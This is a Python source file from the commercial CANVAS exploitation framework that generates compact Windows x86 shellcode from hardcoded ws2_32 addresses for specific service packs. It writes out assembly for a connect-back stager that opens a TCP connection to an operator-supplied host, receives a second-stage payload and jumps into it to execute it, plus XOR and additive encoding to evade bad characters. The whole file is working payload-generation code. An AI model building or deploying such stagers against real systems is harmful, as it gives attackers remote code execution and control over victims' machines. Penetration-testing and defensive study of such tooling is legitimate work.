#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
win32known - if you know something, you get smaller shellcode
"""

import socket
from MOSDEF import mosdef
from win32shellcodegenerator import win32
from exploitutils import *

"""
How to get new addresses for win32knownshellcodegenerator.py . The
benefit here is that you can then create a super-small, but SP dependant,
shellcode for that platform.

Load up a VM and attach to any process that has ws2_32.dll loaded
(you can tell this by going to view->modules)

Go to view->modules and click to select the ws2_32.dll line. Then
type control-N to bring up the names window. Inside this window
type "socket" and it will bring you to the socket line. Write down the
address of socket. Do the same for connect and recv and write them down
as well. Add them to the dictionary below in that order.

Simple, easy, and fun!

We currently don't have a way to test this - it needs to be added
to testsploit.py, but it will work.

Of course, you can also make known-shellcode that is application specific,
but this is beyond this simple text.
"""
knownDict={}
#socket, connect, recv
knownDict["W2KSP4EN"]  = [0x7503353d,0x7503c1b9,0x7503a101]
knownDict["W2K3CN"]    = [0x71b72ea0,0x71b72150,0x71b7fd70]
knownDict["WXPSP0ES"]  = [0x71a33c22,0x71a33e5d,0x71a35690]
knownDict["XPSP1EN"]   = [0x71ab3c22,0x71ab3e5d,0x71AB5690]#71AB5690 recv                   $ 55             PUSH EBP


knownDict["XPSP2EN"]   = [0x71ab3b91,0x71ab406a,0x71ab615a]
knownDict["W2K3SP1EN"] = [0x71c03725, 0x71c0397c, 0x71c07f36]

# socket
# 0x4172d8, 0x4172c8, 
class win32Known(win32):
    def __init__(self):
        win32.__init__(self)
        self.knownfunctions={}
        self.handlers["smallinit_ws2_32"]=self.smallinit_ws2_32
        self.handlers["smalltcpconnect"]=self.smalltcpconnect
        self.handlers["smallrecv"]=self.smallrecv
        self.badstring=""
        
    def knownSP(self,mystr):
        if type(mystr) == type([]):
            knownDict["MYWIN"]=mystr
            s,c,r=mystr
        else:
            s,c,r=knownDict[mystr]
        self.knownfunctions["SOCKET"]=s
        self.knownfunctions["CONNECT"]=c
        self.knownfunctions["RECV"]=r
        return
        
    def finalize(self):
        """Need to do the imports section, the put all the pieces
        together and assemble it with MOSDEF
        """
        if self.finalized:
            return 
        self.finalized=1

        #print "Imports= %s"%self.imports
        #we need some way to exit and it might need to import
        #symbols
        self.code=self.findeipcode+self.code
        bin=mosdef.assemble(self.code,"X86")
        self.value=bin
        return bin
    
    def smallinit_ws2_32(self, args):
        if not self.foundeip:
            #print "Don't have eip and are trying to use it!"
            self.findeip([0])
        # need 3 functions getsystemdirectorya, loadlibrary and wsastartup
        ws2_32code = """
        call pcloc
pcloc:
        popl %ebx
        // get the sysdir
        mov $500,%ecx
        subl %ecx,%esp
        movl %esp,%eax
        pushl %ecx
        pushl %eax
        mov $GETSYSTEMDIRECTORYA,%eax
        call *%eax
        // get end of buf
        movl %esp,%eax
findend:
        cmpb $0,(%eax)
        je foundend
        inc %eax
        jmp findend
foundend:
        leal ws32string-pcloc(%ebx),%esi
strcpyintobuf:
        movb (%esi),%dl
        movb %dl,(%eax)
        test %dl,%dl
        jz donewithstrcpy
        inc %esi
        inc %eax
        jmp strcpyintobuf
donewithstrcpy:
        // try loadlibrary
        movl %esp,%eax
        pushl %eax
        movl $LOADLIBRARYA,%eax
        call *%eax
        jnz fullpathworked
        // chop off the path prepend and try again
        leal ws32string-pcloc(%ebx),%eax
        incl %eax
        pushl %eax
        movl $LOADLIBRARYA,%eax  
        call *%eax
fullpathworked:
        // call wsastartup
        leal 4(%esp),%eax
        pushl %eax
        pushl $0x0101
        movl $WSASTARTUP,%eax
        call *%eax
        jmp postws32string 
ws32string:
        .ascii \"\\ws2_32.dll\"
        .byte 0x00
postws32string:
"""
        ws2_32code = ws2_32code.replace("GETSYSTEMDIRECTORYA","0x%8.8x"%self.knownfunctions["GETSYSTEMDIRECTORYA"])
        ws2_32code = ws2_32code.replace("LOADLIBRARYA","0x%8.8x"%self.knownfunctions["LOADLIBRARYA"])
        ws2_32code = ws2_32code.replace("WSASTARTUP","0x%8.8x"%self.knownfunctions["WSASTARTUP"])
        self.code += ws2_32code
        return

    def smalltcpconnect(self,args):
        if not self.foundeip:
            #print "Don't have eip and are trying to use it!"
            self.findeip([0])

        connectcode="""
        //call socket
        pushl $6
        pushl $1
        pushl $2
        cld
        mov $SOCKET, %eax
        call *%eax
        movl %eax,%esi //save this off
        
        //call connect
        leal 4(%esp),%edi
        movl $PORT,4(%esp)
        movl $IPADDRESS,8(%esp)
        //push addrlen=16
        push $0x10
        pushl %edi
        //push fd
        pushl %eax //our socket fd
        movl $CONNECT, %eax
        call *%eax

        """
        connectcode=connectcode.replace("SOCKET","0x%8.8x"%self.knownfunctions["SOCKET"])
        connectcode=connectcode.replace("CONNECT","0x%8.8x"%self.knownfunctions["CONNECT"])
        if "ipaddress" not in args:
            print "No ipaddress passed to tcpconnect!!!"
        if "port" not in args:
            print "no port in args of tcpconnect"
        ipaddress=socket.inet_aton(socket.gethostbyname(args["ipaddress"]))
        port=int(args["port"])
        connectcode=connectcode.replace("IPADDRESS", uint32fmt(istr2int(ipaddress)))
        connectcode=connectcode.replace("PORT", uint32fmt(reverseword((0x02000000 | port))))
        self.code+=connectcode
        
        return


    def smallrecv(self, args):
        """
        SMALL Recv and exec loop stub to accompany smalltcpconnect.
        
        This code receives a little endian 4 byte len value and recvs
        that much data onto the stack and then jump's to execute it
        
            - leaves the active socket in edx
            - relies on blocking sockets
                we set sockets to blocking in GOcode
            - optional argument "socketreg" is moved into edx
            
            Winsock32.#16 is recv. #4 is connect, #23 is socket
            
        """

        win32RecvExecCode = ""        
        if args!=None and "socketreg" in args.keys():
            sr=args["socketreg"]
            #// this uses edx internally as the socket reg
            if args["socketreg"]=="FDSPOT":
                win32RecvExecCode+="movl FDSPOT-geteip(%ebx), %edx\n"
            elif not sr.count("edx"):
                win32RecvExecCode+="movl %%%s, %%edx\n"%(sr)
        win32RecvExecCode +="""
        //should really switch to using read() which is even smaller.
        win32RecvExecCode:
        // save SOCKET
        pushl %edx 
gogetlen:
        // get lenth of the shellcode
        xorl %ebx,%ebx
        // flags
        pushl %ebx
        // len 4
        push $4
        // recv buf
        pushl %edi
        // SOCKET
        pushl %esi
        // call recv
        movl $RECV, %eax
        call *%eax
        //no error check, no nothin'
gogotlen:
        // get len into eax since we loaded it into the top of the stack
        popl %eax
        // edx is still socket, I hope
        // flags
        pushl %ebx //still zero
        // len
        pushl %eax
        // buf
        pushl %edi
        // SOCKET
        pushl %esi
        mov $RECV, %eax
        call *%eax
        
stagetwo:
        // reset esp so we dont tread on ourself
        // load socket into findeip save reg here
        //movl %edx,%esi
        jmp *%edi
        exit:
        """
        win32RecvExecCode=win32RecvExecCode.replace("RECV","0x%8.8x"%self.knownfunctions["RECV"])
        self.code += win32RecvExecCode
        return

def xoR(data, key):
    ret=""
    for a in range(0, len(data)):
        ret += chr( ord(data[a]) ^ key)
    return ret

def main():
    print "Valid keys in known shellcode dictionary: %s"%knownDict.keys()
    badstring="\x00\x09\x0A\x0B\x0C\x0D\",*.\x20"
    myobj=win32Known()
    myobj.badstring=badstring
    myobj.knownSP("W2KSP4EN")
    #myobj.knownfunctions["SOCKET"]=0x01020304
    #myobj.knownfunctions["CONNECT"]=0x01020304
    #myobj.knownfunctions["RECV"]=0x01020304
    myobj.addAttr("findeipnoesp",{"subespval": 0}) #don't mess with eip
    myobj.addAttr("smalltcpconnect",{"port":4544,"ipaddress":"127.0.0.1"})
    myobj.addAttr("smallrecv",None)
    myobj.addAttr("NoExit",None)
    #self.addAttr("initstackswap",None)
    #self.addAttr("stackSwap",None)
    ret=myobj.get()    
    print "Code=%s"%myobj.getcode()    
    print "len(ret)=%d"%len(ret)
    print "bin=*%s*"%hexprint(ret)

    from encoder import inteladdencoder
    encoder=inteladdencoder()
    encoder.setbadstring("\0\x09\x0A\x0B\x0C\x0D\",*.\x20")
    encodedshellcode=encoder.encode(ret)
    print "length encoded=%s"%len(encodedshellcode)
    badstring="\0\x09\x0A\x0B\x0C\x0D\""
    xored=xoR(ret, 0xa5)
    print "Xoring...."
    print "xored len: %d" % len(xored)

    for a in range(0, len(badstring)):
        if xored.find(badstring[a]) > -1:
                print "char %c (%02x) found :(" % (badstring[a], ord(badstring[a]))
                return ""	
        

    
if __name__=="__main__":
    main()
